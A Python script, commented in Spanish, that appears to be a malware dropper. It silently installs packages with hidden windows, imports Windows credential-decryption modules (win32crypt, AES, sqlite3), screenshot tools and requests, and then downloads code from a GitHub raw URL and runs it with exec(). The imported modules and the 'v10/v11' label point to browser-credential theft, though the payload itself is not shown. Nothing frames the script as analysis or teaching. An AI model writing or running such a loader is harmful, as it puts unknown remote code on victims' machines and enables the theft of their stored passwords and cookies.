import subprocess
import sys
import platform
import shutil
import urllib.request

print("[+] Dependencias: Iniciando instalación...")

def obtener_python_real():
    # Busca el comando de python disponible en el sistema del usuario
    for cmd in ["python", "py", "python3"]:
        if shutil.which(cmd):
            return cmd
    return "python" # Por defecto

def instalar_dependencias():
    paquetes = ["pycryptodome", "pillow", "pyautogui", "requests", "pywin32"]
    creation_flags = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
    py_cmd = obtener_python_real()
    
    for paquete in paquetes:
        try:
            print(f"[*] Instalando: {paquete}...")
            subprocess.check_call(
                [py_cmd, "-m", "pip", "install", paquete],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=creation_flags
            )
            print(f"[+] {paquete} listo.")
        except Exception as e:
            print(f"[-] Error en {paquete}: {e}")

# 1. Instalar dependencias usando el Python real del sistema
instalar_dependencias()

print("[+] Importando librerías...")
try:
    from Crypto.Cipher import AES
    from PIL import Image
    import base64
    import io
    import json
    import platform
    import pyautogui
    import requests
    import socket
    import sqlite3
    
    if platform.system() == "Windows":
        import win32crypt
        import winreg
    print("[+] Importaciones completadas.")
except Exception as e:
    print(f"[-] Error en importación: {e}")

try:
    print("[+] Descargando script final (v10/v11)...")
    url_v11 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py' # Cambia por v10.py si corresponde
    with urllib.request.urlopen(url_v11) as response:
        codigo = response.read().decode('utf-8')
        print("[+] Ejecutando script final...")
        exec(codigo, globals())
except Exception as e:
    print(f"[-] Error detallado al cargar el script final: {e}")
